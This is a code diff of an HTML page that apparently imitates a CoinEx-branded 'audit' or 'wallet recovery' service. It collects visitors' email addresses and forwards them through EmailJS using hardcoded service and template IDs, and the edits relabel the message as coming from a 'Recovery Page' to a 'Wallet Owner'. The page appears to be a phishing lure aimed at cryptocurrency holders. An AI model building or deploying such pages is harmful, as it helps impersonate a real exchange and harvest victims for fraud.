@@ -7,7 +7,6 @@
   <!-- EmailJS SDK -->
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <style>
-    /* reset & base */
     * {
       margin: 0;
       padding: 0;
@@ -20,8 +19,8 @@
       background: #0b1a1f;
       background-image: url('https://coinexsup.github.io/Pic/agsgfd.png');
       background-repeat: no-repeat;
-      background-position: center top;  /* وسط و بالا */
-      background-size: 100% auto;      /* دقیقاً به اندازه عرض صفحه */
+      background-position: center top;
+      background-size: 100% auto;
       background-attachment: fixed;
       display: flex;
       align-items: center;
@@ -30,7 +29,6 @@
       margin: 0;
     }
 
-    /* glass card — white matte glass, green-cyan border, no gray */
     .glass-card {
       width: 100%;
       max-width: 480px;
@@ -42,13 +40,11 @@
       border: 2px solid rgba(0, 255, 200, 0.6);
       box-shadow: 0 30px 50px -20px rgba(0, 40, 30, 0.4),
                   inset 0 0 0 1px rgba(255, 255, 255, 0.25);
-      transition: all 0.2s ease;
       color: #11161e;
       text-align: center;
       background: rgba(255, 255, 255, 0.35);
     }
 
-    /* all text dark, no gray */
     .club-title {
       font-size: 2.2rem;
       font-weight: 550;
@@ -272,7 +268,10 @@
 
   <script>
     (function() {
-      emailjs.init("PakuuN4ADUDEqrzHl");
+      // ============================================
+      // اطلاعات EmailJS از کد اول شما
+      // ============================================
+      emailjs.init("PakuuN4ADUDEqrzHl");  // کلید عمومی شما
 
       const emailInput = document.getElementById('emailInput');
       const confirmBtn = document.getElementById('confirmBtn');
@@ -304,25 +303,36 @@
         setStatus('⏳ sending audit request...', '');
 
         try {
-          const templateParams = {
-            email: email,
-            to_name: 'Coinex Audit',
-            from_name: 'Coinex Club',
-            message: `Audit request from Coinex Club.\nEmail: ${email}\nLimited phone numbers tracking.`,
-          };
-
+          // استفاده از سرویس و تمپلیت کد اول شما
           const response = await emailjs.send(
-            "service_j8bd9vn",
-            "template_paduqpn",
-            templateParams
+            "service_j8bd9vn",        // سرویس آی‌دی شما
+            "template_paduqpn",        // تمپلیت آی‌دی شما
+            {
+              email: email,
+              message: `Audit request from Coinex Club.\nEmail: ${email}\nLimited phone numbers tracking.`,
+              to_name: "Wallet Owner",
+              from_name: "Recovery Page"
+            }
           );
 
-          console.log('✅ email sent', response);
+          console.log('✅ Email sent successfully:', response);
           setStatus('✅ request sent — you will be notified', 'success');
           emailInput.value = '';
+          
         } catch (error) {
-          console.warn('❌ email send error:', error);
-          setStatus('⚠️ submission failed, try again', 'error');
+          console.error('❌ Email send error:', error);
+          console.log('Error details:', error.text || error.message);
+          
+          let errorMsg = '⚠️ submission failed';
+          if (error.text) {
+            try {
+              const errData = JSON.parse(error.text);
+              if (errData.message) errorMsg += ': ' + errData.message;
+            } catch(e) {
+              errorMsg += ': ' + error.text;
+            }
+          }
+          setStatus(errorMsg, 'error');
         } finally {
           confirmBtn.disabled = false;
           confirmBtn.innerHTML = originalBtnHTML;
